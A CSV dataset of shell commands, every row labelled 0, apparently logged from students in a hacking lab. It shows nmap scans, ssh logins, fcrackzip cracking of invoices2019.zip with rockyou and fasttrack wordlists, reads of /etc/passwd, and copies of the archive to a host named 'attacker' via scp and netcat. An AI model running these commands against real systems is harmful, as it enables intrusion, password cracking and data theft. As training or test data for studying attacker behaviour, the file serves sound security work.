value,target
fcrackzip -D -u -v invoices2019.zip,0
fcrackzip -B -u -v invoices2019.zip,0
fcrackzip --dictionary -u -v invoices2019.zip,0
fcrackzip --dictionary -u -v invoices2019.zip/TAX15796249.txt,0
fcrackzip -u -v -p admin  invoices2019.zip,0
fcrackzip -u -v -p adminsssss  invoices2019.zip,0
fcrackzip -u -v -p admin1  invoices2019.zip,0
fcrackzip,0
fcrackzip --help,0
fcrackzip -u -v -m invoices2019.zip,0
fcrackzip -u -v invoices2019.zip,0
fcrackzip -D fasttrack.txt  -u -v invoices2019.zip,0
fcrackzip -D -u -v /root/Downloads/fasttrack.txt  invoices2019.zip,0
fcrackzip -D -u -v -p  /root/Downloads/fasttrack.txt /root/Downloads/invoices2019.zip,0
ssh admin@10.1.26.9,0
nmap -v -A scanme.nmap.org,0
nmap -v -A scnamme.nmap.org,0
nmap -v -A scanmme.nmap.org,0
--help,0
nmap -A 10.1.26.4,0
cd directory,0
fcrackzip -D -p list -u,0
fcrackzip -D -p list -u invoices2019.zip,0
cd invoicees2019.zip,0
cd invoices2019.zip,0
fcrackzip -u -D -p invoices2019.zip,0
cd invoices2019,0
fcrackzip -b -c 'a' -l 1-5 -u invoices2019.zip,0
cd documents,0
cd downloads,0
fcrackzip -b -c 1 -v -u -l 7-7 invoices2019.zip,0
sudo apt update,0
sudo apt install john fcrackzip wordlists,0
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt invoices2019.zip,0
scp admin@10.1.26.9:invoices2019.zip /root/Downloads,0
fcrackzip -D -p list -i invoices2019.zip,0
locate worldlist,0
locate worldlists,0
locate wordlist,0
cd/usr/,0
cd /usr/,0
cd /share,0
cd /usr/share/worldlist/,0
cd /usr/share/worldlists/,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
passwd admin,0
nmap 127.0.0.1,0
nmap 0.0.0.0,0
nmap 10.0.2.0,0
nmap 10.0.2.0/24,0
nmap 10.1.26.0/24,0
ssh 10.1.26.100,0
ssh 10.1.26.0/16,0
nmap 10.1.26.0/16,0
nmap -v 10.1.26.4,0
ssh 10.1.26.9 admin/123456,0
ssh -l admin 10.1.26.9,0
ssh admin@admin 10.1.26.9,0
nfs --help,0
NFS --help,0
NFS,0
path,0
-path,0
--path,0
pdw,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /root,0
scp invoices2019.zip,0
scp -r admin@10.1.26.9:/home/admin/invoices2019.zip /root,0
scp -r admin@10.1.26.9:invoices2019.zip /local/directory,0
scp -r admin@10.1.26.9:/home/admin/invoices2019.zip /local/directory/,0
scp -r admin@10.1.26.9:/home/admin/invoices2019.zip /local/directory,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /local/directory,0
scp admin@10.1.26.9:invoices2019.zip /local/directory,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /local/Documents,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /root/Documents,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /home/,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /home,0
chmod +x,0
chmod +rwx,0
chmod +rwx Documents,0
chmod -rwx Documents,0
scp admin@10.1.26.9:invoices2019.zip /root/Documents,0
cat invoices2019.zip,0
fcrackzip -l invoices2019.zip,0
fcrackzip -l 1 5 invoices2019.zip,0
fcrackzip -l 1 invoices2019.zip,0
fcrackzip -B invoices2019.zip,0
fcrackzip -D invoices2019.zip,0
fcrackzip -V,0
fcrackzip -V invoices2019.zip,0
fcrackzip -u invoices2019.zip,0
fcrackzip -m invoices2019.zip,0
fcrackzip -m 1,0
fcrackzip -m zip1,0
fcrackzip -p invoices2019.zip,0
fcrackzip -p invoices2019.zip 1,0
fcrackzip -p 1 invoices2019.zip,0
fcrackzip -b -c 'a' -v -u invoices2019.zip,0
fcrackzip -b -v -u invoices2019.zip,0
fcrackzip -b -v -u /root.Documents.invoices2019.zip,0
fcrackzip -b -v -u /root.Documents/invoices2019.zip,0
fcrackzip -u /root.Documents/invoices2019.zip,0
sudo bash,0
fcrackzip -f -u -b /root/Documents/invoices2019.zip,0
fcrackzip -v -u -b /root/Documents/invoices2019.zip,0
fcrackzip -p,0
fcrackzip -p invoices2019.zip /usr/share/wordlists/,0
fcrackzip -p invoices2019.zip /usr/share/wordlists/fasttrack.txt,0
fcrackzip -p /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
cd Document,0
fcrackzip -u -p /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
fcrackzip -u -p -D /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
fcrackzip -u -p -D invoices2019/zip /usr/share/wordlists/fasttrack.txt,0
fcrackzip -u -p -D invoices2019.zip /usr/share/wordlists/fasttrack.txt,0
fcrackzip -u -D -p invoices2019.zip /usr/share/wordlists/fasttrack.txt,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt invoice2019.zip,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt /Documents/invoice2019.zip,0
-l admin 10.1.26.9,0
toor,0
unzip invoices2019.zip,0
[3~,0
rmdir,0
rmdir invoices2019,0
fcrackzip.exe-help,0
fcrackzip.exe -help,0
fcrackzip.exe --help,0
sudo apt-get install fcrackzip,0
fcrackzip -u -D -p /usr/share/wordlists.fasttrack.txt invoices2019.zip,0
fcrackzip -u -D -p /usr/share/wordlists.fasttrack.txt,0
fcrackzip -u -D -p /usr/share/wordlists.fasttrack.txt invoices2019.zip ssh admin@10.1.26.9,0
download invoices2019.zip,0
cd italy 2018,0
cd mydata.xlsx,0
extraxt,0
ext,0
cd /mydata.xlsx,0
cd /fasttrack.txt,0
cd fasttrack.txt,0
cd /usr/share/wordlists/fasttrack.txt,0
cd/usr,0
cd /sur,0
cd fasttrack,0
get fasttrack.txt,0
get /fasttrack.txt,0
get fasttrack,0
cp -r invoices2019 desktop,0
cp -r invoices2019.zip desktop,0
desktop,0
cd desktop,0
cat desktop,0
dir -r desktop,0
mkdir -r desktop,0
mkdir --help,0
-r desktop,0
rmdir desktop,0
rm desktop,0
cp -r invoices2019.zip root/desktop,0
cp -r invoices2019.zip /root/desktop,0
sudo cp -r invoices2019.zip /root/desktop,0
cp -r invoices2019.zip,0
cp -r invoices2019.zip home,0
rm home,0
cp -r invoices2019.zip password,0
cp -r home /root/home,0
rm password,0
scp invoices2019.zip ssh admin@server:/root/desktop,0
scp invoices2019.zip ssh root@attacker:/root/desktop,0
scp invoices2019.zip ssh root@server:/root/desktop,0
scp /home/admin/invoices2019.zip ssh root@attacker:/root/desktop,0
scp admin@server:/home/admin/invoices2019.zip /root/desktop,0
infconfig,0
config,0
nmap ipconfig,0
nmap infconfig,0
nmap ifconfig,0
scp /home/admin/invoices2019.zip ssh root@10.0.2.15:/root/desktop,0
scp /home/admin/invoices2019.zip ssh root@10.1.26.23:/root/desktop,0
scp admin@10.1.26.9:invoices2019.zip /home,0
scp admin@10.1.26.9:invoices2019.zip /root/home,0
fcrackzip -u -D -p /root/home,0
fcrackzip -u -D -p /root/home/invoices2019.zip,0
fcrackzip -u -D -p /root/home.zip,0
locate wordlists,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt home,0
nmap -sp 10.1.26.4,0
nmap 10.1.26.4,0
open Mydata.xlsx,0
open Romeo-and-Juliet.pdf,0
xdg-open Romeo-and-Juliet.pdf,0
scp admin@10.1.26.9:invoices2019.zip /root/Desktop,0
scp admin@10.1.26.9:/home/invoices2019.zip /home,0
fcrackzip -b /Desktop/invoices2019.zip,0
fcrackzip -b /root/Desktop/invoices2019.zip,0
fcrackzip -b -u /root/Desktop/invoices2019.zip,0
fcrackzip -D -u /root/Desktop/invoices2019.zip,0
fcrackzip -b -u -v /root/Desktop/invoices2019.zip,0
fcrackzip -v -p invoices2019 /root/Desktop/invoices2019.zip,0
fcrackzip -v -u -p invoices2019 /root/Desktop/invoices2019.zip,0
fcrackzip -v -u /root/Desktop/invoices2019.zip,0
fcrackzip -v -u -c invoices /root/Desktop/invoices2019.zip,0
fcrackzip -v -u -p invoices /root/Desktop/invoices2019.zip,0
fcrackzip -v -u -2 /root/Desktop/invoices2019.zip,0
-D /root/Desktop/fasttrack.txt -b /root/Desktop/invoices2019.zip,0
fcrackzip -D /root/Desktop/fasttrack.txt -b /root/Desktop/invoices2019.zip,0
fcrackzip -v -u -D -p /root/Desktop/fasttrack.txt /root/Desktop/invoices2019.zip,0
passwd,0
whoami,0
shh admin@10.1.26.9,0
scp admin@10.1.26.9:invoices2019.zip /home/Desktop,0
fcrackzip -v -D -p /root/Desktop/fasttrack.txt /root/Desktop/invoices2019.zip,0
passwd Beterwachtwoord123 admin,0
nmap -sP 10.1.26.0/24,0
nmap -sn 10.1.26.0/24,0
ifonfig,0
fcrackzip --h,0
fcrackzip -h,0
nmap -iR,0
nmap -iR 2,0
scp,0
scp invoices2019.zip root@attacker:,0
scp invoices2019.zip root@attacker:exit,0
scp root@attacker,0
scp root@attacker:~/,0
scp root@attacker:~/ invoices2019.zip,0
scp admin@10.1.26.9:/invoices2019.zip Desktop/,0
scp admin@10.1.26.9:invoices2019.zip Desktop/,0
fcrackzip --use-unzip invoices2019.zip,0
fcrackzip --b invoices2019.zip,0
.\\invoices2019.zip,0
fcrackzip -b -c 'a1' -l 6-10 -v -u invoices2019.zip,0
fcrackzip -b,0
fcrackzip -D -v -u invoices2019.zip,0
scp admin@10.1.26.9:Mydata.xlsx Desktop/,0
scp admin@10.1.26.9:Mydata.xlsx Desktop,0
cd Croatia\\ 2019/,0
cd ../Italy\\ 2018/,0
.\\Treasure-Island.pdf,0
scp admin@10.1.26.9:Treasure-Island.pdf Desktop/,0
scp admin@10.1.26.9:Treasure-Island.pdf,0
scp admin@10.1.26.9:Romeo-and-Juliet.pdf Desktop/,0
fcrackzip -b -l 10 -v -u Desktop/invoices2019.zip,0
cd admin/,0
cd vagrant/,0
cd lost+found/,0
cd media/,0
cd bin,0
cd etc/,0
cat passwd,0
cat passwd-,0
wordlists,0
cd wordlists/,0
fcrackzip -v -u -D -p /usr/share/wordlists/fasttrack.txt Desktop/invoices2019.zip,0
cat invoices2019,0
cd invoices2019/,0
rmdir invoices2019/,0
Fcrackzip --help,0
usage fcrackzip,0
/root/Desktop/kali-fcrackzip.desktop,0
root fcrackzip,0
sudo fcrackzip,0
sudo fcrackzip -u -D -p /usr/share/wordlists.fasttrack.txt,0
rooot fcrackzip -u -D -p /usr/share/wordlists.fasttrack.txt,0
root fcrackzip -u -D -p /usr/share/wordlists.fasttrack.txt,0
locate wordslists,0
lx,0
apt-get install fcrackzip,0
fcrackzip -u -D/usr/share/wordlists.fasttrack.txt invoices2019.zip,0
fcrackzip -u -D /usr/share/wordlists.fasttrack.txt invoices2019.zip,0
rmdir -r invoices2019/,0
rm -r invoices2019,0
locate invoices.zip,0
cp invoices2019.zip,0
cp --help,0
/etc/hosts,0
sudo /etc/hosts,0
cd Do,0
cd etc,0
cd /etc,0
cd hosts,0
cd host,0
ipa,0
/usr/share/,0
/wordlists,0
cd /wordlists,0
cd /fa,0
cp -r/R invoices2019.zip,0
cp invoices2019.zip /root/desktop,0
sudo cp invoices2019.zip /root/desktop,0
cp invoices2019.zip /desktop,0
cp -r invoices2019.zip /desktop,0
cd d,0
cp -r /admin/invoices2019.zip /root/desktop,0
root cp -r /admin/invoices2019.zip /root/desktop,0
sudo cp -r /admin/invoices2019.zip /root/desktop,0
cd /home/admin/invoices.zip /root/desktop,0
cd -r /home/admin/invoices.zip /root/desktop,0
cd -r /home/admin/invoices.zip /root/Desktop,0
cd -r/R /home/admin/invoices.zip /root/Desktop,0
cd /home/admin/invoices.zip/ /root/desktop/,0
cd /home/admin/invoices.zip /root/desktop/,0
cd /home/admin/*.zip /root/desktop/,0
cd /home/admin/* /root/desktop/,0
cd -p /home/admin/*.zip /root/desktop/,0
cd -P /home/admin/*.zip /root/desktop/,0
scp /home/admin/invoices2019.zip admin@server:/root/desktop,0
sudo scp /home/admin/invoices2019.zip admin@server:/root/desktop,0
scp /home/admin/invoices2019.zip root@attacker:/root/desktop,0
scp admin@server:/home/admin/invoices2019.zip root@attacker:/root/desktop,0
showmount -e,0
/etc/export,0
cd /etc/export,0
cd exports,0
scp /home/admin/invoices2019.zip 10.1.26.23:/root/desktop,0
scp /home/admin/invoices2019.zip root@attacker/root/desktop,0
scp /home/admin/invoices2019.zip root@attacker /root/desktop,0
scp admin@10.1.26.9:/invoices2019.zip /home,0
scp admin@server:invoices2019.zip /home,0
scp admin@10.1.26.9:invoices2019.zip /desktop,0
cd /root/,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt home.zip,0
cd /shafre,0
nmap 10.0.2.15,0
nmap 10.1.26.23,0
ssh 10.1.26.23,0
ifconfig /all,0
ifconfig all,0
nmap 10.0.2.15 -p,0
nmap -p 10.0.2.15,0
nmap -h 10.0.2.15,0
nmap -f 10.0.2.15,0
ifconfig -a,0
infconfig eth0,0
ifconfig eth0,0
ifconfig lo,0
nmap -s -V,0
ssh admin 10.1.26.9,0
sudo-apt-get update,0
sudo apt-get update,0
scp admin@server:invoices2019.zip /local/directory/,0
scp admin@server:invoices2019.zip root@attacker:downloads,0
scp admin@server:invoices2019.zip downloads,0
scp admin@ipadres:invoices2019.zip /downloads,0
scp admin@10.1.26.9:invoices2019.zip /downloads,0
scp admin@10.1.26.9:invoices2019.zip /Downloads,0
scp admin@10.1.26.9:invoices2019.zip/Downloads,0
scp -i admin@10.1.26.9:invoices2019.zip /Downloads,0
scp -i admin@10.1.26.9:invoices2019.zip /local/directory/,0
scp admin@10.1.26.9:invoices2019.zip /local/directory/,0
scp admin@10.1.26.9:invoices2019.zip /Documents,0
sudo cp /usr/share/wordlists/rockyou.txt.gz rockyou.txt.gz,0
sudo cp /wordlists/rockyou.txt.gz rockyou.txt.gz,0
cd Public,0
cd Templates,0
sudo -b invoices2019.zip,0
sudo cp -b invoices2019.zip,0
sudo cp --help,0
frackzip -u -D -p /usr/share/wordlist/rockyou.txt invoices2019.zip,0
fcrackzip -help,0
fcrackzip -D,0
sudo cp/usr/share/wordlists/rockyou.txt.gz rockyou.txt.gz,0
sudo cp /downloads/wordlists/rockyou.txt.gz rockyou.txt.gz,0
fcrackzip -v -u -D -p /home/root/rockyou.txt /home/root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /usr/share/fasttrack.txt /home/root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /usr/share/fasttrack.txt /home/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /usr/share/fasttrack.txt /root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /home/usr/share/fasttrack.txt /root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /usr/share/set/src/fasttrack.txt /root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /usr/share/set/src/fasttrack/wordlist.txt /root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /usr/share/wordlist/fasttrack.txt /root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /root/desktop/fasttrack.txt /root/Downloads/invoices2019.zip,0
fcrackzip -v -u -D -p /root/Desktop/fasttrack.txt /root/Downloads/invoices2019.zip,0
sudo passwd invoices2019.txt,0
sudo passwd invoices2019,0
sudo passwd invoices2019.zip,0
sudo passwd admin invoices2019.zip,0
sudo passwd admin,0
sudo passwd root,0
locate game_disign.md,0
locate game_design.md,0
d,0
ifocnfig,0
nmap 10.0.2.1/24,0
ssh admin@10.0.2.4,0
ssh admin@10.0.2.15,0
password,0
nmap 10.1.26.1/24,0
base64 invoices2019.zip,0
sudo apt install filezilla,0
filezilla,0
cd Dse,0
cd Eesk,0
fcrackzip -v -u -D -p /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
passwd root,0
test,0
cd docu,0
cd .gnupg/,0
cd ls,0
cd Music,0
cd Pictures,0
cd-create-profile,0
cd-fix-profile,0
cd-it8,0
cd Public/,0
cd Templates/,0
cd Videos,0
cdclear,0
cd .config/,0
cd dconfig,0
cd dconf,0
cat user,0
ls qterminal.org,0
cat qterminal.org/,0
cd qterminal.org/,0
cat qterminal.ini,0
nmap -v -sn 10.1.26.4,0
nmap -v -r,0
help,0
nmap scan,0
nmap -sS -O scanme.nmap.org,0
nmap -sS -O scanme.nmap.org/24,0
nmap -sS 10.1.26.4/9,0
nmap - PS,0
nmap -PS,0
nmap -sL 10.1.26.4,0
nmap -A,0
nmap -pS 10.1.26.4,0
nmap -p 10.1.26.4,0
-help,0
man -k,0
man -K,0
man man,0
nam --help,0
nmap -PS 10.1.26.4,0
nmap -A 10.1.26.6,0
nmap -PS 10.1.26.9,0
ssh host_ip_address,0
ssh your_username@host_ip_address,0
ssh attacker 10.1.26.9,0
ssh attacker@10.1.26.9,0
cat Mydata.xlsx,0
ccd,0
nfs,0
cat Treasure-Island.pdf,0
cat Romeo-and-Juliet.pdf,0
scp --help,0
scp help,0
scp admin@10.1.26.9:/invoices2019.zip root@attacker:/Documents,0
scp admin@10.1.26.9:/invoices2019.zip root:/Documents,0
scp admin@10.1.26.9:invoices2019.zip root:Documents,0
scp admin@10.1.26.9:invoices2019.zip root/Documents,0
scp admin@10.1.26.9:invoices2019.zip root@attacker/Documents,0
scp admin@10.1.26.9:invoices2019.zip root@attacker:/Documents,0
scp admin@10.1.26.9:invoices2019.zip/root/Documents,0
wordlist --help,0
cd user,0
cd User,0
cat fasttrackt.txt,0
fcrackzap -u -D -p /user/share/wordlists/fasttrack.txt invoices2019.zip,0
fcrackzip -u -D -p /user/share/wordlists/fasttrack.txt invoices2019.zip,0
cd Docuemtns,0
cd invoices.2019,0
net user loginid,0
net user admin newpassword,0
net --help,0
net user admin,0
passwd tom admin,0
passwd -e admin,0
passwd -a,0
passwd -a admin,0
passwd --help,0
passwd -d admin,0
passwd -r r,0
passwd -r admin,0
passwd -r,0
passwd -u admin,0
cd wordslists,0
fcrackzip -D -p /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
uname,0
who,0
nmap 10.1.26.23/24,0
nmap 10.0.2.15/24,0
nmap 10.0.2.15/24 -O,0
nmap 127.0.0.1/24 -O,0
nmap 10.0.2.15 -O,0
nmap -A -T4 -p- 10.1.26.9,0
cp ~invoices2019.zip,0
scp admin@10.1.26.9,0
scp admin@10.1.26.9:/invoices2021.zip/home,0
scp admin@10.1.26.9/invoices2021.zip/home,0
scp admin@10.1.26.9/invoices2021.zip /home,0
scp admin@10.1.26.9/invoices2019.zip /home,0
cp admin@10.1.26.9:/invoices2019.zip /home,0
scp admin@10.1.26.9:invoices2021.zip /home,0
scp admin@10.1.26.9: invoices2019.zip /home,0
scp admin@10.1.26.9:/zip /home,0
fcrackzip -u -c 1 -l 4-8 /home/invoices2019.zip,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt /home/invoices2019.zip,0
-- help,0
nmap -A-T4 -p- 10.1.26.9,0
cd Home,0
cd /Home,0
ssh 10.1.26.9:22,0
scp -r admin@10.1.26.9/invoices2019.zip /downloads,0
scp -r admin@10.1.26.9/invoices2019.zip local/downloads,0
scp admin@10.1.26.9:invoices2019.zip root/Downloads,0
scp admin@10.1.26.9:invoices2019.zip attacker/Downloads,0
ls /Downloads,0
ls /Downlopads,0
fcrackzip -b -u,0
fcrackzip -b -D -u invoices2019.zip,0
fcrackzip -b -D -u /invoices2019.zip,0
fcrackzip -b -D -u root/Downloads/invoices2019.zip,0
fcrackzip -b -u /invoices2019.zip,0
fcrackzip -b -u -v invoices2019.zip,0
fcrackzip -c -u -v invoices2019.zip,0
fcrackzip -l -u -v invoices2019.zip,0
fcrackzip -V -u -v invoices2019.zip,0
fcrackzip -m,0
fcrackzip -2,0
fcrackzip -2 invoices2019.zip,0
sudo cp /usr/share/wordlists/fasttrack.txt fasttrack.txt,0
fcrackzip -v -u -D /fasttrack.txt /invoices2019.zip,0
fcrackzip -v -u -D fasttrack.txt invoices2019.zip,0
fcrackzip -v -u -D,0
fcrackzip -v -u -D invoices2019.zip,0
fcrackzip -v -u -D invoices2019.zip/TAX15796249.txt,0
fcrackzip -v -u -D invoices2019.zip/TAX15796249,0
fcrackzip -v -u -D -p fasttrack.txt invoices2019.zip,0
scp admin@10.1.26.23:invoices2019.zip /root/Downloads,0
ls root/Downloads,0
scp admin@10.1.26.9:Croatia /root/Downloads,0
scp admin@10.1.26.9:Croatia 2019 /root/Downloads,0
scp admin@10.1.26.9:'Croatia 2019' /root/Downloads,0
scp admin@10.1.26.9:Romeo-and-Juliet.pdf /root/Downloads,0
scp admin@10.1.26.9:Treasuree-Island.pdf /root/Downloads,0
scp admin@10.1.26.9:Treasure-Island.pdf /root/Downloads,0
cd 'Croatia 2019',0
scp admin@10.1.26.9:/Croatia 2019/dubrovnik.jpg /root/Downloads,0
scp admin@10.1.26.9:/'Croatia 2019'/dubrovnik.jpg /root/Downloads,0
fcrackzip invoices2019.zip,0
fcrackzip invoices2019.zip --help,0
fcrackzip -v invoices2019.zip,0
fcrackzip -D /usr/share/wordlists/fasttrack.txt,0
fcrackzip -D /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
frcrackzip invoices2019.txt -D /usr/share/wordlists/fasttrack.txt,0
fcrackzip invoices2019.txt -D /usr/share/wordlists/fasttrack.txt,0
fcrackzip invoices2019.txt -D,0
fcrackzip invoices2019.zip -D,0
fcrackzip -D /usr/share/wordlists invoices2019.zip,0
fcrackzip -D -u /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
fcrackzip -v -u -D /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
asd,0
eexiit,0
Fcrackzip -u -D -P /usr/share/wordlists/fasttrackt.txt invoices2019.zip,0
scp root@10.0.2.15:/root /home/admin/invoices2019.zip,0
nmap -A 10.1.0.0,0
scp invoices2019.zip root@10.1.26.23:/,0
scp admin@10.1.26.9:/invoices2019.zip /,0
scp invoices2019.zip root@10.1.26.23:/home,0
scp invoices2019.zip root@10.1.26.23:/home/downloads/,0
xit,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /home/root/,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /home/root/invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip /home/root,0
cd /home/,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip ~/zip/invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip .,0
fcrackzip invoices2019.zip -b -D,0
scp admin@10.1.26.9:/home/admin/Romeo-and-Juliet.pdf .,0
scp admin@10.1.26.9:/home/admin/Treasure-Island.pdf .,0
fcrackzip invoices2019.zip -b -D Treasure-Island.pdf,0
fcrackzip invoices2019.zip -b -c Treasure-Island.pdf,0
fcrackzip -D -p Treasure-Island.pdf invoices2019.zip,0
fcrackzip -D -p Romeo-and-Juliet.pdf invoices2019.zip,0
fcrackzip -u -D -v -p Romeo-and-Juliet.pdf invoices2019.zip,0
fcrackzip -u -D -v -p Treasure-Island.pdf invoices2019.zip,0
fcrackzip -u -b -v -c aA invoices2019.zip,0
fcrackzip -c aA -p aaaaaaaaaa invoices2019.zip,0
cd/,0
cd Italy\\ 2018/,0
cd usr/,0
cd share/,0
cat wordlists/,0
fcrackzip -u -D /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
password admin,0
psswd,0
frackzip -c a -p aaaaaa invoices2019.zip,0
fcrackzip -c a -p aaaaaa invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/invoices2019.zip invoices2019.zip,0
frackzip -v -u -b -c a -l 6 invoices2019.zip,0
fcrackzip -v -u -b -c a -l 6 invoices2019.zip,0
fcrackzip -v -u -b -c a -l 8 invoices2019.zip,0
cd /opt/,0
fcrackzip -b -c 'a1' -l 1-8,0
fcrackzip -b -c 'a1' -l 1-8 invoices2019.zip,0
fcrackzip -b -c 'a1' -l 1-8 -v -u invoices2019.zip,0
/usr/share/wordlists/,0
rm invoices2019.zip,0
nmap -p- 10.1.26.4,0
man ssh,0
man ssh --example,0
ls -l /usr/share/wordlists,0
fcrackzip -D -p /usr/share/wordlists/fasttrack.txt -u /root/invoices2019.zip -v,0
--help nmap,0
nmap -v -A 10.1.26.4,0
sudo nmap 10.1.26.4,0
sudo nmap 10.1.26.5,0
10.1.26.9,0
sudo nmap 10.1.26.9,0
sS,0
ssh admin@admin,0
ssh 10.1.26.9 admin@admin,0
ls invoices2019.zip,0
cp invoices2019.zip documents,0
cp invoices2019.zip /documents,0
cp invoices2019.zip ~/Documents,0
scp invoices2019.zip root@attacker:/Documents,0
scp invoices2019.zip root@attacker:/root/Documents,0
scp invoices2019.zip root@attacker,0
scp invoices2019.zip root@10.0.2.15,0
scp invoices2019.zip root@10.0.2.23,0
scp admin@10.1.26.9:invoices.zip /home,0
--help fcrackzip,0
fcrackzip -b /home/invoices2019.zip,0
fcrack -u -D -p /usr/share/wordlists/rockyou.txt /home/invoices2019.zip,0
fcrack -u -D -p /usr/share/wordlists/rockyou.txt invoices2019.zip,0
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt /home/invoices2019.zip,0
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt.gz /home/invoices2019.zip,0
sudo root,0
ls hacking/,0
ls Documents/,0
ls Downloads/,0
nmap -sS 10.1.26.0/24,0
cd personal/,0
ls Croatia\ 2019/,0
ls Italy\ 2018/,0
more Mydata.xlsx,0
more Romeo-and-Juliet.pdf,0
more Treasure-Island.pdf,0
ls lost+found/,0
ls admin/,0
ls -a admin/,0
ls admin/.profile,0
scp .invoices2019.zip attacker@10.1.26.26,0
scp .invoices2019.zip attacker@10.1.26.26:/home,0
scp .invoices2019.zip attacker@10.1.26.23:/home,0
scp .invoices2019.zip root@10.1.26.23:/home,0
scp .invoices2019.zip root@10.1.26.23:/,0
scp .invoices2019.zip root@10.1.26.23:/root,0
scp admin@10.1.26.9:/personal/.invoices2019.zip /root/,0
ssh admin@10.1.26.23,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /root/,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@10.1.26.23:/root,0
cd root/,0
mv .invoices2019.zip invoices2019.zip,0
cd hacking/,0
more wordlist.txt,0
fcrackzip -u -D -p /root/hacking/wordlist.txt /root/invoices2019.zip,0
more TAX157962,0
more TAX15796249.txt,0
more TAX15796252.txt,0
more TAX15796259.txt,0
echo Jack,0
nmap 10.1.26.0-24,0
cd Italy\ 2018/,0
cd Croatia\ 2019/,0
cd personal,0
cd ../admin/,0
scp .invoices2019.zip root@attacker:.,0
scp .invoices2019.zip root@10.1.26.3,0
scp .invoices2019.zip root@10.1.26.23,0
scp .invoices2019.zip root@10.1.26.23:~/hacking,0
scp .invoices2019.zip root@attacker:~/hacking,0
scp .invoices2019.zip 10.1.26.23:~,0
scp .invoices2019.zip root@10.1.26.23:~,0
nc -l -p 9999 > invoices.zip,0
nc -l -p 9999 > invoices.zip &,0
nc 10.1.26.23 9999 < .invoices2019.zip,0
scp .invoices2019.zip admin@10.1.26.23:~/hacking,0
cd ../.ssh,0
cd ../hacking,0
rm root@10.1.26.23,0
rm root@10.1.26.3,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip .,0
man fcrackzip,0
fcrackzip -D wordlist.txt .invoices2019.zip,0
less wordlist.txt,0
fcrackzip -D .invoices2019.zip,0
fcrackzip -D -p wordlist.txt .invoices2019.zip,0
"echo ""Bob""",0
cat wordlist.txt,0
nmap -v -sn 10.1.26.0/24,0
scp -h,0
scp .invoices2019.zip root@10.1.26.23:,0
scp admin@server:/personal/.invoices2019.zip ./,0
scp admin@10.1.26.9:/personal/.invoices2019.zip ./,0
